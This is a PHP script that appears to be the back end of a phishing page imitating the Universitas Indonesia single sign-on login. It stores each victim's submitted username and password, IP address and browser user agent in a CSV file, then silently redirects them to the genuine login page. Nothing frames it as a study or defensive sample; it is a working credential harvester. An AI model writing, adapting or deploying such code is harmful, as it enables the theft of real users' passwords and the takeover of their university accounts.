<?php
/**
 * @author Ryan Aunur Rassyid<112010057>
 */

$nama_file_penuh_dosa = "apatuh.csv";
$header = "username,password,ip,user_agent,created_at";
$redirect = "https://sso.ui.ac.id/cas/login?service=https%3A%2F%2Fsso.ui.ac.id%2Faccount%2Fcas%3Fdestination%3Duser";

if (isset($_POST['_eventId']) && $_POST['_eventId'] == 'submit') {
  $file = fopen($nama_file_penuh_dosa, "a");
  // credential
  $username = $_POST['username'];
  $password = $_POST['password'];
  $ip = $_SERVER['REMOTE_ADDR'];
  $userAgent = $_SERVER['HTTP_USER_AGENT'];
  
  fputcsv($file, [
    $username, $password, $ip, $userAgent, date('d-m-Y H:i:s')
  ]);
  fclose($file);

  header("Location: $redirect");
  exit();
} else {
  header("Location: index.php");
  exit();
}
